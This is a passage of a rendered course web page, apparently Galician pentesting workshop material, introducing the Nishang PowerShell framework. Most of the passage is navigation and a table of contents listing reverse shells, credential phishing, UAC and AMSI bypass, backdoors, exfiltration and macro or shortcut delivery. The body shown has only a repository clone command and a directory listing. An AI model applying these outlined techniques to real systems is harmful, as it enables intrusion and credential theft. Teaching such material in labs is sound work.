+    <span class="md-ellipsis">
+      Vía HTA (HTML Application)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#via-macro-de-word" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vía Macro de Word
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#via-lnk-acceso-directo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vía LNK (Acceso Directo)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mellores-practicas" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mellores Prácticas
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ofuscacion-basica" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ofuscación Básica
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#deteccion-e-contramedidas" class="md-nav__link">
+    <span class="md-ellipsis">
+      Detección e Contramedidas
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#notas-legais-e-eticas" class="md-nav__link">
+    <span class="md-ellipsis">
+      Notas Legais e Éticas
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recursos-adicionais" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recursos Adicionais
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller UD3
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Prácticas Taller UD3
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Pivoting
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Pivoting
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/doc-vulnyx-pivoting-war-basic/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows / Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/doc-vulnyx-pivoting-basic-war/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux / Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    VulNyx
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            VulNyx
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/vulnyx/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introdución
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2" id="__nav_3_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Prácticas Taller
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Prácticas Taller
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2_1" id="__nav_3_2_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Fase 5. Persistencia. Máquinas virtuais nivel Low, so Linux
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Fase 5. Persistencia. Máquinas virtuais nivel Low, so Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/indice_vulnyx_low_linux_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/practicas-taller-vulnyx-persistencia/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Máquinas VulNyx
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2_2_2" id="__nav_3_2_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Fase 5. Persistencia. Máquinas virtuais nivel Low, Easy, Medium, so Windows
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Fase 5. Persistencia. Máquinas virtuais nivel Low, Easy, Medium, so Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/indice_vulnyx_low_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice Low
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/indice_vulnyx_easy_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice Easy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/indice_vulnyx_medium_windows_fases/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Índice Medium
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/practicas-taller-windows-persistencia/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Máquinas Vulnyx
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Vuln Lab AD-DC
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Vuln Lab AD-DC
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3_1" id="__nav_3_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Laboratorio
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            Laboratorio
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/windows/vuln-lab-ad/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    README
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/windows/vuln-lab-ad/1-GUIA_MESTRA_VULN_HE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Guía mestra
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3_1_3" id="__nav_3_3_1_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Ataques específicos
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_3_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            Ataques específicos
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/windows/vuln-lab-ad/8-ATAQUE_ESPECIFICO_SILVER_TICKET/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Silver Ticket
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/windows/vuln-lab-ad/9-ATAQUE_ESPECIFICO_GOLDEN_TICKET/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Golden Ticket
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practicas-taller/windows/vuln-lab-ad/6-ANALISE_USUARIOS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Análise usuarios
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#descricion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Descrición
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#instalacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Instalación
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Instalación">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#desde-github" class="md-nav__link">
+    <span class="md-ellipsis">
+      Desde GitHub
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#estrutura-de-directorios" class="md-nav__link">
+    <span class="md-ellipsis">
+      Estrutura de Directorios
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#modulos-principais" class="md-nav__link">
+    <span class="md-ellipsis">
+      Módulos Principais
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Módulos Principais">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-shells" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Shells
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. Shells">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#como-funciona-a-carga-en-memoria" class="md-nav__link">
+    <span class="md-ellipsis">
+      Como funciona a carga en memoria
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#invoke-powershelltcp-reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invoke-PowerShellTcp (Reverse Shell)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#invoke-powershelltcponeline" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invoke-PowerShellTcpOneLine
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-gather-recoleccion-de-informacion" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Gather (Recolección de Información)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Gather (Recolección de Información)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#get-information" class="md-nav__link">
+    <span class="md-ellipsis">
+      Get-Information
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-wlan-keys" class="md-nav__link">
+    <span class="md-ellipsis">
+      Get-WLAN-Keys
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#invoke-credentialsphish" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invoke-CredentialsPhish
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-escalation-escalada-de-privilexios" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Escalation (Escalada de Privilexios)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Escalation (Escalada de Privilexios)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#invoke-psuacme" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invoke-PsUACme
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#enable-duplicatetoken" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enable-DuplicateToken
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-execution-execucion" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Execution (Execución)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Execution (Execución)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#invoke-encode" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invoke-Encode
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#download-execute-ps" class="md-nav__link">
+    <span class="md-ellipsis">
+      Download-Execute-PS
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-bypass-evasion" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Bypass (Evasión)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Bypass (Evasión)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#invoke-amsibypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invoke-AmsiBypass
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-backdoors" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. Backdoors
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. Backdoors">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#http-backdoor" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP-Backdoor
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dns_txt_pwnage" class="md-nav__link">
+    <span class="md-ellipsis">
+      DNS_TXT_Pwnage
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7-client-lado-do-cliente" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. Client (Lado do Cliente)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="7. Client (Lado do Cliente)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#out-chm" class="md-nav__link">
+    <span class="md-ellipsis">
+      Out-CHM
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#out-word" class="md-nav__link">
+    <span class="md-ellipsis">
+      Out-Word
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#8-pivot" class="md-nav__link">
+    <span class="md-ellipsis">
+      8. Pivot
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="8. Pivot">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#invoke-networkrelay" class="md-nav__link">
+    <span class="md-ellipsis">
+      Invoke-NetworkRelay
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exemplos-practicos-completos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exemplos Prácticos Completos
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exemplos Prácticos Completos">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#escenario-1-shells-reversas-e-bind" class="md-nav__link">
+    <span class="md-ellipsis">
+      Escenario 1: Shells Reversas e Bind
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Escenario 1: Shells Reversas e Bind">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#opcion-a-reverse-shell-tcp-invoke-powershelltcp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción A: Reverse Shell TCP (Invoke-PowerShellTcp)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-b-reverse-shell-oneline-recomendado-mais-estable" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción B: Reverse Shell OneLine (RECOMENDADO - Máis estable)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-c-bind-shell-tcp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción C: Bind Shell TCP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-d-reverse-shell-udp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción D: Reverse Shell UDP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-e-icmp-shell-icmpsh-avanzado-e-limitado" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción E: ICMP Shell (icmpsh) - AVANZADO E LIMITADO
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#comparacion-de-shells" class="md-nav__link">
+    <span class="md-ellipsis">
+      Comparación de Shells
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#escenario-2-recoleccion-de-informacion-exfiltracion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Escenario 2: Recolección de Información + Exfiltración
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Escenario 2: Recolección de Información + Exfiltración">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#metodo-en-memoria-recomendado" class="md-nav__link">
+    <span class="md-ellipsis">
+      Método en Memoria (Recomendado)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#escenario-3-bypass-uac-escalada-de-privilexios" class="md-nav__link">
+    <span class="md-ellipsis">
+      Escenario 3: Bypass UAC + Escalada de Privilexios
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Escenario 3: Bypass UAC + Escalada de Privilexios">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#secuencia-completa-en-memoria" class="md-nav__link">
+    <span class="md-ellipsis">
+      Secuencia Completa en Memoria
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#verificar-privilexios" class="md-nav__link">
+    <span class="md-ellipsis">
+      Verificar Privilexios
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#metodos-alternativos-de-uac-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      Métodos Alternativos de UAC Bypass
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#escenario-4-persistencia" class="md-nav__link">
+    <span class="md-ellipsis">
+      Escenario 4: Persistencia
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Escenario 4: Persistencia">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#opcion-a-backdoor-en-screensaver-en-memoria" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción A: Backdoor en Screensaver (En Memoria)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-b-http-backdoor-polling-periodico" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción B: HTTP Backdoor (Polling Periódico)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-c-tarea-programada-desde-ficheiro-local" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción C: Tarea Programada (Desde ficheiro local)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-d-dns-txt-backdoor-sigiloso" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción D: DNS TXT Backdoor (Sigiloso)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tecnicas-de-entrega" class="md-nav__link">
+    <span class="md-ellipsis">
+      Técnicas de Entrega
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Técnicas de Entrega">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#via-hta-html-application" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vía HTA (HTML Application)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#via-macro-de-word" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vía Macro de Word
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#via-lnk-acceso-directo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vía LNK (Acceso Directo)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mellores-practicas" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mellores Prácticas
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ofuscacion-basica" class="md-nav__link">
+    <span class="md-ellipsis">
+      Ofuscación Básica
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#deteccion-e-contramedidas" class="md-nav__link">
+    <span class="md-ellipsis">
+      Detección e Contramedidas
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#notas-legais-e-eticas" class="md-nav__link">
+    <span class="md-ellipsis">
+      Notas Legais e Éticas
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recursos-adicionais" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recursos Adicionais
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="nishang-powershell-framework-para-pentesting">Nishang - PowerShell Framework para Pentesting</h1>
+<h2 id="descricion">Descrición</h2>
+<p><strong>Nishang</strong> é un framework completo de scripts de PowerShell deseñado especificamente para probas de penetración, post-explotación e operacións ofensivas de Red Team en ambientes Windows. Foi creado por Nikhil Mittal e é amplamente usado pola comunidade de seguridade.</p>
+<h2 id="instalacion">Instalación</h2>
+<h3 id="desde-github">Desde GitHub</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/samratashok/nishang.git
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">cd</span><span class="w"> </span>nishang
+</span></code></pre></div>
+<h3 id="estrutura-de-directorios">Estrutura de Directorios</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nishang/
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>├── Antak-WebShell/      # Web shells en ASPX
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>├── Backdoors/           # Scripts de backdoors
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>├── Bypass/              # Scripts de evasión
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>├── Client/              # Ataques do lado do cliente
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>├── Escalation/          # Escalada de privilexios
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>├── Execution/           # Execución de comandos
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>├── Gather/              # Recolección de información
